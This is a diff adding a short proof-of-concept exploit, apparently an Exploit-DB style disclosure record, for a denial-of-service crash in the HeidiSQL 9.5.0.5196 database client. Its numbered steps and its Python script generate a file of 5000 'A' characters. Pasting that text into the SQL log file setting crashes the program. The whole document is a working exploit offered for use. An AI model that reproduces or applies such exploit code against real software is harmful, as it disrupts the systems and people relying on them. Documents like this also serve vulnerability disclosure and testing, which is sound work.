@@ -1,0 +1,23 @@
+# Exploit Title: HeidiSQL 9.5.0.5196 - Denial of Service (PoC)
+# Discovery by: Victor Mondragón
+# Discovery Date: 2018-11-06
+# Vendor Homepage: https://www.heidisql.com/
+# Software Link: https://www.heidisql.com/download.php
+# Tested Version: 9.5.0.5196
+# Tested on: Windows 10 Single Language x64 / Windows 7 x64 Service Pack 1
+
+#Steps to produce the crash:
+#1.- Run python code: HeidiSQL 9.5.0.5196.py
+#2.- Open bd.txt and copy content to clipboard
+#2.- Open HeidiSQL
+#3.- Select "More"
+#4.- Select "Preferences" > "Logging"
+#5.- Select "Write SQL log to file" and Paste ClipBoard
+#6.- Click on "OK"
+#7.- Crashed
+
+cod = "\x41" * 5000
+
+f = open('bd.txt', 'w')
+f.write(cod)
+f.close()
